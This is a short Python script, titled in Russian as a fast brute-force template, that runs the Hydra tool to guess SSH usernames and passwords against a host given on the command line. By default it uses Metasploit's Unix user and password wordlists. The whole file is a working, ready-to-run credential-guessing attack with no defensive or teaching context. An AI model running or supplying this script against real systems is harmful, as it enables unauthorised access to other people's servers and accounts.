# Hydra SSH template — быстрый брутфорс
import subprocess
import sys

def hydra_ssh(host, port, userlist, passlist):
    print(f"[+] Hydra SSH: {host}:{port}")
    cmd = ["hydra", "-L", userlist, "-P", passlist,
           "-s", str(port), "-t", "4", "-f", host, "ssh"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        print(r.stdout[:2000])
        if r.stderr:
            print("[stderr]", r.stderr[:500])
    except Exception as e:
        print(f"[-] {e}")

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = sys.argv[2] if len(sys.argv) > 2 else "22"
    users = sys.argv[3] if len(sys.argv) > 3 else "/usr/share/wordlists/metasploit/unix_users.txt"
    pwds  = sys.argv[4] if len(sys.argv) > 4 else "/usr/share/wordlists/metasploit/unix_passwords.txt"
    hydra_ssh(host, port, users, pwds)